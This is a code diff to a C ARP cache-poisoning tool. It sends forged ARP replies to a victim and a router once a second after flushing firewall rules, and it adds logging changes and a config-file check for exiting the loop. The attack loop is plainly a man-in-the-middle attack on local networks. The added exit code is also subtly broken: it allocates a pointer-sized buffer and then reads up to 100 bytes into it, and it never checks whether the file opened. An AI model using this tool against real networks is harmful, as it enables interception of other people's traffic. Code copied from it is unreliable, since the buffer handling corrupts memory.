@@ -107,8 +107,8 @@ char* get_mac_addr(int socket, char *interface) {
 
 	sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5]);
 
-	fprintf(stdout, "Interface: %s\n", interface);
-	fprintf(stderr, "MAC ADDR: %s\n", mac);
+	submit_log("Interface: %s\n", interface);
+	submit_log("MAC ADDR: %s\n", mac);
 
 	return mac;
 	//print_mac_addr(src_mac);
@@ -133,7 +133,7 @@ char* get_ip_addr(int socket, char *interface) {
 	strcpy(src_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 
 	
-	fprintf(stdout, "IP ADDR: %s\n", src_ip);
+	submit_log("IP ADDR: %s\n", src_ip);
 }
 
 int main(int argc, char **argv) {
@@ -142,6 +142,8 @@ int main(int argc, char **argv) {
 	int arg, c;
 	int unidir = 0;
 	char *interface = NULL;
+	char *exitValue;
+	FILE *config;
 
 	if(argc < 2) {
 		fprintf(stderr, "Too Few Arguments\n");
@@ -209,8 +211,9 @@ int main(int argc, char **argv) {
 		submit_log("%s", "Unable to Flush the Firewall rules");
 		return EXIT_FAILURE;
 	}
+	
 
-	while (1) {
+	while (TRUE) {
 		//ethernet = create_eth_header(ROUTER_MAC_ADDR, VICTIM_MAC_ADDR, ETHERTYPE_ARP);
 		//arp = create_arp_header(MY_MAC_ADDR, ROUTER_IP_ADDR, BROADCAST_MAC_ADDR, VICTIM_IP_ADDR, ARP_REQUEST);
 		//send_packet(ethernet, arp, interface);
@@ -227,10 +230,25 @@ int main(int argc, char **argv) {
 		arp = create_arp_header(MY_MAC_ADDR, VICTIM_IP_ADDR, ROUTER_MAC_ADDR, ROUTER_IP_ADDR, ARP_REPLY);
 		send_packet(ethernet, arp, interface);
 
-			sleep(1);
-	}
+		sleep(1);
 
-	
+		config = fopen(CONFIG_FILE_LOC, "r");
+		exitValue = malloc(sizeof(char *));
+		rewind(config); // Seek to the beginning of the file
+		if(fgets(exitValue, 100, config) != NULL) {
+			fprintf(stdout, "%c\n", exitValue[0]);
+			fflush(stdout);
+
+			if(exitValue[0] == '1') {
+				fprintf(stdout, "Exiting.....\n");
+				break;
+			}
+		}
+
+		free(exitValue);
+		fclose(config);
+		
+	}
 
 	return 0;
 }
